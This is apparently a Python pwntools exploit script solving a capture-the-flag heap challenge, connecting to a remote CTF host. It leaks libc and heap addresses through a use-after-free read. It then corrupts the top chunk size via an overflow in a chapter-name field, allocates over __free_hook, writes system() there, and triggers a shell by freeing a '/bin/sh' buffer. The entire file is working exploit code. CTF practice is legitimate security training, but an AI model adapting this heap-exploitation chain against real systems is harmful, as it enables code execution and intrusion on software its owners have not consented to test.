#!/usr/bin/env python
from pwn import *

NAME = "./pwnable"
LIB = "./libc-2.27.so"
elf = ELF(NAME, checksec=False)
libc = ELF("./libc-2.27-dbg.so", checksec=False)

# rcx == NULL
context.update(arch=elf.arch, terminal=["tmux", "split-window", "-h", "-p 50"],)

context.log_level = 'debug'
def add_page(page_size, data):
    r.sendlineafter(">", str(1))
    r.sendlineafter("\n", str(page_size))
    r.sendlineafter("\n", data)

def read_page(page_num):
    r.sendlineafter(">", str(2))
    r.sendlineafter("\n", str(page_num))
    return r.recv(16)
    #log.info(r.recvline())

def delete_page(page_num):
    r.sendlineafter(">", str(3))
    r.sendlineafter("\n", str(page_num))

def name_chapter(chapter_name):
    r.sendlineafter(">", str(4))
    r.sendlineafter("\n", chapter_name)

def exploit(r):
    # leak libc and heap
    add_page(0x428, b"A" * 30)
    add_page(40, b"B" * 20)
    add_page(40, b"C" * 20)
    delete_page(0)
    unsorted_bin = u64(read_page(0)[0:8])
    log.info(f"Libc Leak: {hex(unsorted_bin)}")
    delete_page(1) 
    delete_page(2)
    heap = u64(read_page(2)[0:8])
    log.info(f"Heap Leak: {hex(heap)}")

    libc_base = unsorted_bin - libc.symbols["main_arena"] - 96
    system_addr = libc_base + libc.symbols["system"]
    free_hook = libc_base + libc.symbols["__free_hook"]
    # allocate near __free_hook
    
    one_gadget = 0x4f2c5 + libc_base

    name_chapter(b"A" * 40 + p64(0xFFFFFFFFFFFFFFFF))
    top_chunk = heap + 96
    sz = free_hook - top_chunk - 0x10
    log.info(f"{sz} {hex(top_chunk)} {hex(free_hook)} {hex(system_addr)}")
    add_page(sz, b"/bin/sh\x00")
    add_page(0x430, p64(system_addr) * 2)


    #gdb.attach(r)
    #pause()
    # trigger shell
    delete_page(3)
    r.interactive()
     

if __name__ == '__main__':
    #r = process(NAME, env={"LD_PRELOAD" : LIB,})
    r = remote("chal.utc-ctf.club", 64116)
    exploit(r)
